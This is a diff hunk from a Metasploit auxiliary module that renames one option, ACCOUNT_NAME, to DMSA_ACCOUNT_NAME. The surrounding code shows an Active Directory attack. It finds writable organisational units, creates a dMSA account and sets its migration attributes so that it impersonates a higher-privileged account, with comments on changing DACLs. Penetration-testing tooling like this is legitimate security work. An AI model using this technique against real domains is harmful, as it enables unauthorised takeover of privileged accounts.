@@ -342,17 +342,17 @@ class MetasploitModule < Msf::Auxiliary
       writeable_dn = ous.first
       fail_with(Failure::NoTarget, "There are no Organization Units we can write to, the exploit can not continue") if ous.empty?
       print_good("Found #{ous.length} OUs we can write to")
-      create_dmsa(datastore['ACCOUNT_NAME'], writeable_dn)
+      create_dmsa(datastore['DMSA_ACCOUNT_NAME'], writeable_dn)
 
-      sam_account_name = datastore['ACCOUNT_NAME'] + '$' unless datastore['ACCOUNT_NAME'].ends_with?('$')
+      sam_account_name = datastore['DMSA_ACCOUNT_NAME'] + '$' unless datastore['DMSA_ACCOUNT_NAME'].ends_with?('$')
       user_raw_filter = "(sAMAccountName=#{sam_account_name})"
       attributes = ['DN', 'objectSID', 'objectClass', 'primarygroupID']
       our_account = ldap.search(base: @base_dn, filter: user_raw_filter, attributes: attributes)&.first
       #TODO I already have FullControl over this dMSA - this might not always be the case
       #TODO It's possible you'll only end up with Owner (and in turn WriteDacl) which will require the module to edit the Dacl so we can then set the dmsa attributes to complete the dMSA account migration to impersonate the higher privileged account
-      #grant_write_all_properties("CN=#{datastore['ACCOUNT_NAME']},#{writeable_dn}", Rex::Proto::MsDtyp::MsDtypSid.read(our_account[:objectsid].first))
-      set_dmsa_attributes("CN=#{datastore['ACCOUNT_NAME']},#{writeable_dn}","2", "CN=#{datastore['ACCOUNT_TO_IMPERSONATE']},CN=Users,DC=msf,DC=local")
-      query_account(datastore['ACCOUNT_NAME'], writeable_dn)
+      #grant_write_all_properties("CN=#{datastore['DMSA_ACCOUNT_NAME']},#{writeable_dn}", Rex::Proto::MsDtyp::MsDtypSid.read(our_account[:objectsid].first))
+      set_dmsa_attributes("CN=#{datastore['DMSA_ACCOUNT_NAME']},#{writeable_dn}","2", "CN=#{datastore['ACCOUNT_TO_IMPERSONATE']},CN=Users,DC=msf,DC=local")
+      query_account(datastore['DMSA_ACCOUNT_NAME'], writeable_dn)
     end
   end
 end
